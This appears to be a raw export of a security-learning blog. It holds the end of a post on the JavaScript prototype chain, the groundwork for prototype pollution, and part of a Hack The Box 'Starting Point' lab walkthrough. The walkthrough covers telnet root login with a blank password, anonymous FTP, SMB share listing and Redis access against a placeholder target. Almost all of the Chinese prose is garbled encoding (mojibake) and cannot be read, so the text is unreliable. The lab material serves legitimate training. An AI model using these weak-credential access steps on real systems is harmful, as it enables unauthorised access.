<p>æ•´ä½“çœ‹æ¥å°±æ˜¯å¤šä¸ªå¯¹è±¡å±‚å±‚ç»§æ‰¿ï¼Œå®ä¾‹å¯¹è±¡çš„åŸå‹é“¾æ¥å½¢æˆäº†ä¸€æ¡é“¾ï¼Œä¹Ÿå°±æ˜¯ js çš„åŸå‹é“¾</p>
</blockquote>
<blockquote>
<p>åŸå‹ä¹‹é—´ä¹Ÿå¯ä»¥ç›¸äº’ç»§æ‰¿ï¼Œæ¯”å¦‚ä½ æœ‰ä¸€ä¸ªå­¦ç”Ÿç±»çš„åŸå‹ï¼Œå®ƒ<code>ç»§æ‰¿äº†äººç±»çš„åŸå‹</code>ï¼Œä½†æ˜¯å®ƒè¿˜æœ‰è‡ªå·±çš„å±æ€§å’Œæ–¹æ³•ï¼Œæ¯”å¦‚å­¦å·ã€å­¦ä¹ ç­‰ã€‚é‚£ä¹ˆä½ å¯ä»¥ç”¨è¿™ä¸ªå­¦ç”Ÿç±»çš„åŸå‹æ¥åˆ›å»ºå¾ˆå¤šå­¦ç”Ÿçš„å¯¹è±¡ï¼Œä»–ä»¬æ—¢ä¼šç»§æ‰¿äººç±»çš„å±æ€§å’Œæ–¹æ³•ï¼Œä¹Ÿä¼šç»§æ‰¿å­¦ç”Ÿç±»çš„å±æ€§å’Œæ–¹æ³•ã€‚è¿™æ ·å°±å½¢æˆäº†ä¸€ä¸ªåŸå‹é“¾ï¼Œå®ƒå†³å®šäº†å¯¹è±¡ä¹‹é—´çš„å…³ç³»ã€‚</p>
</blockquote>
<h2 id="åŸå‹å¯¹è±¡çš„å®šä¹‰"><a href="#åŸå‹å¯¹è±¡çš„å®šä¹‰" class="headerlink" title="åŸå‹å¯¹è±¡çš„å®šä¹‰"></a>åŸå‹å¯¹è±¡çš„å®šä¹‰</h2><blockquote>
<p>åŸå‹å¯¹è±¡æ˜¯JavaScriptä¸­çš„ä¸€ç§ç‰¹æ®Šçš„å¯¹è±¡ï¼Œå®ƒå¯ä»¥è¢«é™„åŠ åˆ°å…¶ä»–å¯¹è±¡æˆ–å‡½æ•°ä¸Šï¼Œä»è€Œå®ç°å¯¹è±¡ä¹‹é—´çš„ç»§æ‰¿å’Œå…±äº«ã€‚åŸå‹å¯¹è±¡æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒæœ‰è‡ªå·±çš„åŸå‹ï¼Œå½¢æˆä¸€ä¸ªåŸå‹é“¾ã€‚åŸå‹é“¾åœ¨é‡åˆ°<code>null</code>ä¸ºåŸå‹çš„å¯¹è±¡æ—¶ç»“æŸã€‚æ‚¨å¯ä»¥é€šè¿‡è®¾ç½®æˆ–ä¿®æ”¹ä¸€ä¸ªå¯¹è±¡æˆ–å‡½æ•°çš„<code>prototype</code>å±æ€§æ¥æ”¹å˜å®ƒçš„åŸå‹ã€‚</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt;<span class="comment">// åˆ›å»ºä¸€ä¸ªç©ºå¯¹è±¡</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">&gt;<span class="comment">// è®¾ç½®objçš„åŸå‹ä¸ºå¦ä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line">obj.<span class="property">__proto__</span> = &#123;<span class="attr">name</span>: <span class="string">&quot;Alice&quot;</span>, <span class="attr">age</span>: <span class="number">20</span>&#125;;</span><br><span class="line"><span class="comment">// è®¿é—®objçš„nameå±æ€§ï¼Œå®é™…ä¸Šæ˜¯è®¿é—®å®ƒçš„åŸå‹çš„nameå±æ€§</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">name</span>); <span class="comment">// Alice</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ç›´æ¥åœ¨æ§åˆ¶å°ä¸­è¿›è¡Œ</p>
<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B5%85%E5%85%A5/image-20230826164140299.png" alt="image-20230826164140299"></p>
</blockquote>
<blockquote>
<p>åœ¨JavaScriptä¸­,å£°æ˜ä¸€ä¸ªå‡½æ•°Açš„åŒæ—¶,æµè§ˆå™¨åœ¨å†…å­˜ä¸­åˆ›å»ºä¸€ä¸ªå¯¹è±¡B,ç„¶åAå‡½æ•°é»˜è®¤æœ‰ä¸€ä¸ªå±æ€§<code>prototype</code>æŒ‡å‘äº†è¿™ä¸ªå¯¹è±¡B,è¿™ä¸ªBå°±æ˜¯å‡½æ•°Açš„åŸå‹å¯¹è±¡,ç®€ç§°ä¸ºå‡½æ•°çš„åŸå‹ã€‚è¿™ä¸ªå¯¹è±¡Bé»˜è®¤ä¼šæœ‰ä¸ªå±æ€§<code>constructor</code>æŒ‡å‘äº†è¿™ä¸ªå‡½æ•°Aã€‚</p>
<p>å¦‚ä¸‹å›¾ä¸­ï¼Œå‡½æ•°<code>Foo</code>çš„<code>prototype</code>æŒ‡å‘<code>&#123;constuctor:f&#125;</code>ï¼Œè€Œ<code>&#123;constuctor:f&#125;</code>çš„å±æ€§<code>constuctor</code>æŒ‡å‘å‡½æ•°<code>Foo</code></p>
<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B5%85%E5%85%A5/image-20230827094453409.png" alt="image-20230827094453409"></p>
</blockquote>
<h3 id="å®ä¾‹å¯¹è±¡"><a href="#å®ä¾‹å¯¹è±¡" class="headerlink" title="å®ä¾‹å¯¹è±¡"></a>å®ä¾‹å¯¹è±¡</h3><blockquote>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ å‡½æ•°Aæ„å»ºä¸€ä¸ªå®ä¾‹å¯¹è±¡Aï¼ŒAé»˜è®¤ä¼šæœ‰ä¸€ä¸ªå±æ€§<code>__proto__</code>æŒ‡å‘äº†æ„é€ å‡½æ•°Açš„åŸå‹å¯¹è±¡Bã€‚</p>
</blockquote>
<h3 id="åŸå‹å¯¹è±¡å’Œå®ä¾‹å¯¹è±¡çš„å…³ç³»"><a href="#åŸå‹å¯¹è±¡å’Œå®ä¾‹å¯¹è±¡çš„å…³ç³»" class="headerlink" title="åŸå‹å¯¹è±¡å’Œå®ä¾‹å¯¹è±¡çš„å…³ç³»"></a>åŸå‹å¯¹è±¡å’Œå®ä¾‹å¯¹è±¡çš„å…³ç³»</h3><p>å¦‚ä¸‹å›¾ä¸­ï¼Œ<code>foo</code>ä¸º<code>Foo</code>å‡½æ•°çš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œ<code>foo</code>çš„<code>__proto__</code>åˆšå¥½ç­‰äº<code>Foo</code>å‡½æ•°çš„åŸå‹å¯¹è±¡ï¼Œè¿”å›ä¸º<code>true</code></p>
<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B5%85%E5%85%A5/image-20230827095320595.png" alt="image-20230827095320595"></p>
<h2 id="åŸå‹é“¾æœºåˆ¶"><a href="#åŸå‹é“¾æœºåˆ¶" class="headerlink" title="åŸå‹é“¾æœºåˆ¶"></a>åŸå‹é“¾æœºåˆ¶</h2><p>æ¦‚å¿µå¯ä»¥çœ‹ä¸€ä¸‹</p>
<blockquote>
<p>æ¯ä¸ªæ„é€ å‡½æ•°éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡ï¼ŒåŸå‹å¯¹è±¡éƒ½åŒ…å«ä¸€ä¸ªæŒ‡å‘æ„é€ å‡½æ•°çš„æŒ‡é’ˆï¼Œè€Œå®ä¾‹éƒ½åŒ…å«ä¸€ä¸ªæŒ‡å‘åŸå‹å¯¹è±¡çš„å†…éƒ¨æŒ‡é’ˆã€‚é‚£ä¹ˆå‡å¦‚æˆ‘ä»¬è®©åŸå‹å¯¹è±¡ç­‰äºå¦ä¸€ä¸ªç±»å‹çš„å®ä¾‹ï¼Œç»“æœä¼šæ€ä¹ˆæ ·ï¼Ÿæ˜¾ç„¶ï¼Œæ­¤æ—¶çš„åŸå‹å¯¹è±¡å°†åŒ…å«ç­‰äºå¦ä¸€ä¸ªåŸå‹çš„æŒ‡é’ˆï¼Œç›¸åº”åœ°ï¼Œå¦ä¸€ä¸ªåŸå‹åˆæ˜¯å¦ä¸€ä¸ªç±»å‹åœ°å®ä¾‹ï¼Œé‚£ä¹ˆä¸Šè¿°åœ°å…³ç³»ä¾ç„¶æˆç«‹ã€‚å¦‚æ­¤å±‚å±‚é€’è¿›ï¼Œå°±æ„æˆäº†å®ä¾‹ä¸åŸå‹çš„é“¾æ¡</p>
</blockquote>
<p>æ¦‚å¿µå¤ªç»•äº†ï¼Œè§£æä¸€ä¸‹å›¾ç‰‡</p>
<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B5%85%E5%85%A5/image-20230827100718098.png" alt="	"></p>
<p><code>Person</code>ä½œä¸ºæ„é€ å‡½æ•°ï¼Œæ¯ä¸€ä¸ªæ„é€ å‡½æ•°éƒ½æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡<code>Person.prototype</code>ï¼Œè€ŒåŸå‹å¯¹è±¡éƒ½åŒ…å«ä¸€ä¸ªæŒ‡å‘æ„é€ å‡½æ•°çš„æŒ‡é’ˆ[<code>constructor</code>]</p>
<p>è€Œå…¶ä¸­<code>person</code>ä½œä¸º<code>Person</code>æ„é€ å‡½æ•°çš„å®ä¾‹[<code>let person = new Person();</code>]ï¼Œä¹ŸåŒ…å«ä¸€ä¸ªæŒ‡å‘åŸå‹å¯¹è±¡çš„å†…éƒ¨æŒ‡é’ˆ[<code>__proto__</code>]</p>
<p>äºæ˜¯æœ€åè¿™ä¸ªåŸå‹é“¾å°±æ˜¯</p>
<blockquote>
<p><code>person -&gt; Person.protype -&gt; Object.prototype -&gt; null</code></p>
</blockquote>
<p>å¯ä»¥çœ‹åˆ°åŸå‹é“¾çš„ç»“å°¾å°±æ˜¯null</p>
<h2 id="è¿‡æ»¤ç»•è¿‡"><a href="#è¿‡æ»¤ç»•è¿‡" class="headerlink" title="è¿‡æ»¤ç»•è¿‡"></a>è¿‡æ»¤ç»•è¿‡</h2><h3 id="proto"><a href="#proto" class="headerlink" title="__proto__"></a><code>__proto__</code></h3><blockquote>
<p>constructor.prototype</p>
</blockquote>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>htbã®STARTING POINT</title>
    <url>//post/htb(STARTING-POINT)/</url>
    <content><![CDATA[<p><strong><code>æƒ³å‡†å¤‡è¯•è¯•OSCPï¼ŒHACK THE BOXè¿˜è¡Œï¼Œå­¦ä¹ ä¸€äº›å®æˆ˜çŸ¥è¯†ï¼Œä»¥åŠä¸€äº›æ¦‚å¿µäº†è§£ï¼Œéƒ¨åˆ†æœºå™¨æ ¹æ®åè®®ï¼Œæˆ‘ä¼šæ€»ç»“çŸ¥è¯†ç‚¹ï¼Œä¸ä¼šç»™å‡ºå…¨éƒ¨</code></strong></p>
<span id="more"></span>

<h1 id="STARTING-POINT"><a href="#STARTING-POINT" class="headerlink" title="STARTING POINT"></a>STARTING POINT</h1><h1 id="ç¬¬0å±‚"><a href="#ç¬¬0å±‚" class="headerlink" title="ç¬¬0å±‚"></a>ç¬¬0å±‚</h1><h2 id="Meow"><a href="#Meow" class="headerlink" title="*Meow"></a>*Meow</h2><h3 id="Tags"><a href="#Tags" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>telnet</code></p>
<p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p>
<p><code>ç½‘ç»œ</code></p>
<p><code>åè®®</code></p>
<p><code>ä¾¦å¯Ÿ</code></p>
<p><code>å¼±å‡­è¯</code></p>
<p><code>é…ç½®é”™è¯¯</code></p>
</blockquote>
<h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote>
<ol>
<li>VPN å¯åŠ¨åºåˆ—è¾“å‡ºä¸­â€œéš§é“æ¥å£â€çš„ç¼©å†™åç§°ï¼š<code>tun</code></li>
<li>æˆ‘ä»¬ä½¿ç”¨ä»€ä¹ˆå·¥å…·é€šè¿‡ ICMP å›æ˜¾è¯·æ±‚æµ‹è¯•æˆ‘ä»¬ä¸ç›®æ ‡çš„è¿æ¥ï¼š<code>ping</code>ã€pingä¸èµ°ä»£ç†ã€‘</li>
<li>ç”¨äºåœ¨ç›®æ ‡ä¸ŠæŸ¥æ‰¾å¼€æ”¾ç«¯å£çš„æœ€å¸¸ç”¨å·¥å…·çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿï¼š<code>nmap</code></li>
<li>æˆ‘ä»¬åœ¨æ‰«ææœŸé—´åœ¨ç«¯å£ 23&#x2F;tcp ä¸Šè¯†åˆ«å‡ºä»€ä¹ˆæœåŠ¡ï¼Ÿ:<code>telnet</code>ã€è¿œç¨‹ç™»å½•ã€‘</li>
<li>ä»€ä¹ˆç”¨æˆ·åèƒ½å¤Ÿä½¿ç”¨ç©ºç™½å¯†ç é€šè¿‡ telnet ç™»å½•ç›®æ ‡ï¼Ÿ: <code>root</code></li>
</ol>
</blockquote>
<h4 id="telnetå’Œsshçš„åŒºåˆ«"><a href="#telnetå’Œsshçš„åŒºåˆ«" class="headerlink" title="telnetå’Œsshçš„åŒºåˆ«"></a>telnetå’Œsshçš„åŒºåˆ«</h4><blockquote>
<p>åŠ å¯†æ–¹å¼ä¸åŒï¼š**<code>telnet</code>æ˜¯æ˜ç ä¼ è¾“<strong>ï¼Œ</strong><code>SSH</code>æ˜¯åŠ å¯†ä¼ è¾“**ã€‚ <code>telnet</code>é€šè¿‡<code>TCP/IP</code>åè®®ç°‡æ¥è®¿é—®è¿œç¨‹ç»ˆç«¯ï¼Œ<code>ä¼ è¾“çš„æ•°æ®å’Œå£ä»¤æ˜¯æ˜æ–‡å½¢å¼</code>ã€‚ ç›¸å¯¹æ¥è¯´ä¸å®‰å…¨ï¼Œä½ æ‰€æœ‰çš„æ•°æ®éƒ½å¯è¢«æ”»å‡»è€…ç›´æ¥æ•è·ã€‚ <strong>SSHç›¸å¯¹äºtelnetå®‰å…¨</strong>ï¼Œå®ƒçš„<code>ä¼ è¾“æ–¹å¼æ˜¯ä»¥åŠ å¯†å½¢å¼ä¼ è¾“</code></p>
</blockquote>
<h3 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">telnet</span><span class="meta"> [target_ip]</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/htb(STARTING-POINT)/image-20230127011324556.png" alt="image-20230127011324556"></p>
<h2 id="Fawn"><a href="#Fawn" class="headerlink" title="*Fawn"></a>*Fawn</h2><h3 id="Tags-1"><a href="#Tags-1" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p>
<p><code>ftp</code></p>
<p><code>ç½‘ç»œ</code></p>
<p><code>åè®®</code></p>
<p><code>ä¾¦å¯Ÿ</code></p>
<p><code>åŒ¿å/è®¿å®¢è®¿é—®</code></p>
</blockquote>
<h3 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote>
<ol>
<li><p>3 ä¸ªå­—æ¯çš„é¦–å­—æ¯ç¼©ç•¥è¯ FTP ä»£è¡¨ä»€ä¹ˆï¼Ÿ: <code>File Transfer Protocol</code>(æ–‡ä»¶ä¼ è¾“åè®®)</p>
</li>
<li><p>FTPæœåŠ¡é€šå¸¸ç›‘å¬å“ªä¸ªç«¯å£ï¼Ÿ: <code>21</code></p>
</li>
<li><p>FTP çš„å®‰å…¨ç‰ˆæœ¬ä½¿ç”¨ä»€ä¹ˆé¦–å­—æ¯ç¼©å†™è¯ï¼Ÿ: <code>SFTP</code></p>
</li>
<li><p>å½“æ‚¨æƒ³åœ¨æ²¡æœ‰å¸æˆ·çš„æƒ…å†µä¸‹ç™»å½•æ—¶ï¼Œé€šè¿‡ <code>FTP</code> ä½¿ç”¨çš„ç”¨æˆ·åæ˜¯ä»€ä¹ˆï¼Ÿ: <code>anonymous</code></p>
</li>
<li><p>æˆ‘ä»¬å¾—åˆ°çš„ FTP æ¶ˆæ¯â€œç™»å½•æˆåŠŸâ€çš„å“åº”ä»£ç æ˜¯ä»€ä¹ˆï¼Ÿ:<code>230</code></p>
<p><img src="/post/htb(STARTING-POINT)/image-20230127001710275.png" alt="image-20230127001710275"></p>
</li>
<li><p>ç”¨äºä¸‹è½½æˆ‘ä»¬åœ¨ FTP æœåŠ¡å™¨ä¸Šæ‰¾åˆ°çš„æ–‡ä»¶çš„å‘½ä»¤æ˜¯ä»€ä¹ˆï¼Ÿ:<code>get</code></p>
</li>
</ol>
</blockquote>
<h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><blockquote>
<p>æ–‡ä»¶ä¼ è¾“åè®®ï¼ˆFile Transfer Protocolï¼ŒFTPï¼‰æ˜¯ç”¨äºåœ¨<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C?fromModule=lemma_inlink">ç½‘ç»œ</a>ä¸Šè¿›è¡Œæ–‡ä»¶ä¼ è¾“çš„ä¸€å¥—æ ‡å‡†åè®®ï¼Œå®ƒå·¥ä½œåœ¨ OSI æ¨¡å‹çš„ç¬¬ä¸ƒå±‚ï¼Œ TCP æ¨¡å‹çš„ç¬¬å››å±‚ï¼Œ å³åº”ç”¨å±‚ï¼Œ ä½¿ç”¨ TCP ä¼ è¾“è€Œä¸æ˜¯ UDPï¼Œ å®¢æˆ·åœ¨å’ŒæœåŠ¡å™¨å»ºç«‹è¿æ¥å‰è¦ç»è¿‡ä¸€ä¸ªâ€œä¸‰æ¬¡æ¡æ‰‹â€çš„è¿‡ç¨‹ï¼Œ ä¿è¯å®¢æˆ·ä¸æœåŠ¡å™¨ä¹‹é—´çš„è¿æ¥æ˜¯å¯é çš„ï¼Œ è€Œä¸”æ˜¯é¢å‘è¿æ¥ï¼Œ ä¸ºæ•°æ®ä¼ è¾“æä¾›å¯é ä¿è¯ã€‚</p>
</blockquote>
<h4 id="SFTP"><a href="#SFTP" class="headerlink" title="SFTP"></a>SFTP</h4><blockquote>
<p><code>sftp</code>æ˜¯Secure File Transfer Protocolçš„ç¼©å†™ï¼Œå®‰å…¨æ–‡ä»¶ä¼ é€åè®®ã€‚å¯ä»¥ä¸ºä¼ è¾“æ–‡ä»¶æä¾›ä¸€ç§å®‰å…¨çš„ç½‘ç»œçš„åŠ å¯†æ–¹æ³•ã€‚sftp ä¸ ftp æœ‰ç€å‡ ä¹ä¸€æ ·çš„è¯­æ³•å’ŒåŠŸèƒ½ã€‚<code>SFTP ä¸º SSHçš„å…¶ä¸­ä¸€éƒ¨åˆ†</code>ï¼Œæ˜¯ä¸€ç§ä¼ è¾“æ¡£æ¡ˆè‡³ Blogger ä¼ºæœå™¨çš„å®‰å…¨æ–¹å¼ã€‚å…¶å®åœ¨<code>SSHè½¯ä»¶åŒ…</code>ä¸­ï¼Œå·²ç»åŒ…å«äº†ä¸€ä¸ªå«ä½œ<code>SFTP(Secure File Transfer Protocol)çš„å®‰å…¨æ–‡ä»¶ä¿¡æ¯ä¼ è¾“å­ç³»ç»Ÿ</code>ï¼ŒSFTP<code>æœ¬èº«æ²¡æœ‰å•ç‹¬çš„å®ˆæŠ¤è¿›ç¨‹</code>ï¼Œå®ƒ<code>å¿…é¡»ä½¿ç”¨sshdå®ˆæŠ¤è¿›ç¨‹ï¼ˆç«¯å£å·é»˜è®¤æ˜¯22ï¼‰</code>æ¥å®Œæˆç›¸åº”çš„è¿æ¥å’Œç­”å¤æ“ä½œï¼Œæ‰€ä»¥ä»æŸç§æ„ä¹‰ä¸Šæ¥è¯´ï¼ŒSFTPå¹¶ä¸åƒä¸€ä¸ªæœåŠ¡å™¨ç¨‹åºï¼Œè€Œæ›´åƒæ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯ç¨‹åºã€‚</p>
<p>SFTPåŒæ ·æ˜¯ä½¿ç”¨åŠ å¯†ä¼ è¾“è®¤è¯ä¿¡æ¯å’Œä¼ è¾“çš„æ•°æ®ï¼Œæ‰€ä»¥ï¼Œä½¿ç”¨SFTPæ˜¯éå¸¸å®‰å…¨çš„ã€‚ä½†æ˜¯ï¼Œç”±äºè¿™ç§ä¼ è¾“æ–¹å¼ä½¿ç”¨äº†åŠ å¯†&#x2F;è§£å¯†æŠ€æœ¯ï¼Œæ‰€ä»¥<code>ä¼ è¾“æ•ˆç‡æ¯”æ™®é€šçš„FTPè¦ä½å¾—å¤š</code>ï¼Œå¦‚æœæ‚¨å¯¹ç½‘ç»œå®‰å…¨æ€§è¦æ±‚æ›´é«˜æ—¶ï¼Œå¯ä»¥ä½¿ç”¨SFTPä»£æ›¿FTPã€‚</p>
</blockquote>
<h3 id="è¿‡ç¨‹-1"><a href="#è¿‡ç¨‹-1" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">ftp <span class="selector-attr">[USER@]</span>HOST <span class="selector-attr">[PORT]</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/htb(STARTING-POINT)/image-20230127011036214.png" alt="image-20230127011036214"></p>
<h2 id="Dancing"><a href="#Dancing" class="headerlink" title="*Dancing"></a>*Dancing</h2><h3 id="Tags-2"><a href="#Tags-2" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>ç½‘ç»œ</code></p>
<p><code>åè®®</code></p>
<p><code>SMB</code></p>
<p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p>
<p><code>ä¾¦å¯Ÿ</code></p>
<p><code>åŒ¿å/è®¿å®¢è®¿é—®</code></p>
</blockquote>
<h3 id="çŸ¥è¯†ç‚¹-2"><a href="#çŸ¥è¯†ç‚¹-2" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote>
<ol>
<li>3 ä¸ªå­—æ¯çš„é¦–å­—æ¯ç¼©ç•¥è¯ SMB ä»£è¡¨ä»€ä¹ˆï¼Ÿ:<code>Server Message Block</code>(æœåŠ¡å™¨æ¶ˆæ¯å—)</li>
<li>SMB ä½¿ç”¨å“ªä¸ªç«¯å£è¿›è¡Œæ“ä½œï¼Ÿ: <code>445</code></li>
<li>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ SMB å·¥å…·æ¥â€œåˆ—å‡ºâ€å…±äº«å†…å®¹çš„â€œæ ‡å¿—â€æˆ–â€œå¼€å…³â€æ˜¯ä»€ä¹ˆï¼Ÿ: <code>-L</code></li>
<li>æˆ‘ä»¬æœ€ç»ˆèƒ½å¤Ÿä½¿ç”¨ç©ºç™½å¯†ç è®¿é—®çš„å…±äº«åç§°æ˜¯ä»€ä¹ˆï¼Ÿ: <code>WorkShares</code></li>
<li>æˆ‘ä»¬å¯ä»¥åœ¨ SMB shell ä¸­ä½¿ç”¨ä»€ä¹ˆå‘½ä»¤æ¥ä¸‹è½½æˆ‘ä»¬æ‰¾åˆ°çš„æ–‡ä»¶ï¼Ÿ: <code>get</code></li>
</ol>
</blockquote>
<h4 id="ä»€ä¹ˆæ˜¯SMB"><a href="#ä»€ä¹ˆæ˜¯SMB" class="headerlink" title="ä»€ä¹ˆæ˜¯SMB"></a>ä»€ä¹ˆæ˜¯SMB</h4><blockquote>
<p><code>SMB</code>æ˜¯å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨çš„äº¤äº’åè®®ï¼Œå®¢æˆ·ç«¯åœ¨å…¶ä¸­è¯·æ±‚æ–‡ä»¶ï¼Œç„¶åæœåŠ¡å™¨å°†æ–‡ä»¶æä¾›ç»™å®¢æˆ·ç«¯ã€‚</p>
<p>ç°åœ¨ï¼Œå®ƒæ˜¯ä¸€ä¸ªåŸºäºWindowsçš„ç½‘ç»œï¼Œä½¿ç”¨æˆ·å¯ä»¥åˆ›å»ºï¼Œä¿®æ”¹å’Œåˆ é™¤ç½‘ç»œä¸­çš„å…±äº«æ–‡ä»¶ï¼Œæ–‡ä»¶å¤¹ï¼Œæ‰“å°æœºã€‚SMBæ˜¯ä½¿ç”¨TCPç«¯å£445è¿›è¡Œé€šä¿¡çš„åº”ç”¨ç¨‹åºåˆ†å±‚åè®®ã€‚</p>
<p>å®ƒè¿˜æä¾›äº†ä¸€ç§è‰æ ¹åŒ–çš„äº’é€šæœºåˆ¶ï¼Œå¯ä»¥åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´è¿›è¡Œä¼ è¾“ä»¥å…±äº«æ–‡ä»¶ã€‚éšç€å…¶ç‰ˆæœ¬çš„å‡çº§ï¼ŒæœåŠ¡å°†å¾—åˆ°æ›´å¤§çš„å¢å¼ºï¼Œå¹¶å¯ä»¥è¢«ç”¨æˆ·æˆ–å®¢æˆ·ç«¯æœ‰æ•ˆä½¿ç”¨ã€‚</p>
</blockquote>
<h4 id="SMBå¦‚ä½•è¿ä½œ"><a href="#SMBå¦‚ä½•è¿ä½œ" class="headerlink" title="SMBå¦‚ä½•è¿ä½œ"></a>SMBå¦‚ä½•è¿ä½œ</h4><blockquote>
<p><code>SMB</code>æ˜¯ä¸€ç§è¯·æ±‚-å“åº”åè®®ï¼Œè¿™æ„å‘³ç€å®ƒåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´ä¼ è¾“å¤šæ¡æ¶ˆæ¯ä»¥å®Œæˆè¯·æ±‚ã€‚</p>
</blockquote>
<h4 id="FTP-SMB-NFSçš„åŒºåˆ«"><a href="#FTP-SMB-NFSçš„åŒºåˆ«" class="headerlink" title="FTP, SMB, NFSçš„åŒºåˆ«"></a>FTP, SMB, NFSçš„åŒºåˆ«</h4><p><img src="/post/htb(STARTING-POINT)/image-20230127003921531.png" alt="image-20230127003921531"></p>
<blockquote>
<p><code>NFS</code> æœ€å¥½ï¼Œé€Ÿåº¦å¿«ç‚¹ï¼Œé…ç½®å¤æ‚ç‚¹<br><code>FTP</code> æœ€é€šç”¨ï¼Œæœ€ç®€å•<br><code>SMB</code> ä¸å¤ªç¨³å®šï¼Œæœ‰æ—¶å€™Win ä¼šæç¤ºæ‰¾ä¸åˆ°åœ°å€</p>
</blockquote>
<h3 id="è¿‡ç¨‹-2"><a href="#è¿‡ç¨‹-2" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><blockquote>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"> <span class="attribute">smbclient</span> -L<span class="meta"> [target_ip]</span></span><br><span class="line"><span class="comment">#åˆ—å‡ºæ‰€æœ‰å¯ç”¨å…±äº«</span></span><br></pre></td></tr></table></figure>

</blockquote>
<p><img src="/post/htb(STARTING-POINT)/image-20230127010237573.png" alt="image-20230127010237573"></p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">smbclient <span class="symbol">\\</span><span class="symbol">\\</span>[target_ip]<span class="symbol">\\</span>WorkShares</span><br><span class="line">#è¿æ¥åˆ° WorkShares</span><br></pre></td></tr></table></figure>

<p><img src="/post/htb(STARTING-POINT)/image-20230127010626438.png" alt="image-20230127010626438"></p>
<h2 id="Redeemer"><a href="#Redeemer" class="headerlink" title="Redeemer"></a>Redeemer</h2><h3 id="Tags-3"><a href="#Tags-3" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>Redis</code></p>
<p><code>æ¸—é€æµ‹è¯•ä»ª 1 çº§</code></p>
<p><code>æ¼æ´è¯„ä¼°</code></p>
<p><code>æ•°æ®åº“</code></p>
<p><code>ä¾¦å¯Ÿ</code></p>
<p><code>åŒ¿å/è®¿å®¢è®¿é—®</code></p>
</blockquote>
<h3 id="çŸ¥è¯†ç‚¹-3"><a href="#çŸ¥è¯†ç‚¹-3" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><blockquote>
<ol>
<li>Redis æ˜¯ä»€ä¹ˆç±»å‹çš„æ•°æ®åº“ï¼Ÿ:<code>In-memory Database</code>(å†…å­˜æ•°æ®åº“)</li>
<li>å“ªä¸ªå‘½ä»¤è¡Œå®ç”¨ç¨‹åºç”¨äºä¸ Redis æœåŠ¡å™¨äº¤äº’ï¼Ÿè¾“å…¥æ‚¨è¦åœ¨ç»ˆç«¯ä¸­è¾“å…¥çš„ç¨‹åºåç§°ï¼Œä¸å¸¦ä»»ä½•å‚æ•°ã€‚: <code>redis-cli</code></li>
<li>Redis å‘½ä»¤è¡Œå®ç”¨ç¨‹åºä½¿ç”¨å“ªä¸ªæ ‡å¿—æ¥æŒ‡å®šä¸»æœºåï¼Ÿ: <code>-h</code></li>
<li>è¿æ¥åˆ°RedisæœåŠ¡å™¨åï¼Œä½¿ç”¨å“ªä¸ªå‘½ä»¤è·å–æœ‰å…³RedisæœåŠ¡å™¨çš„ä¿¡æ¯å’Œç»Ÿè®¡ä¿¡æ¯ï¼Ÿ: <code>info</code></li>
<li>åœ¨ Redis ä¸­ä½¿ç”¨å“ªä¸ªå‘½ä»¤æ¥é€‰æ‹©æ‰€éœ€çš„æ•°æ®åº“ï¼Ÿ:  <code>select</code></li>
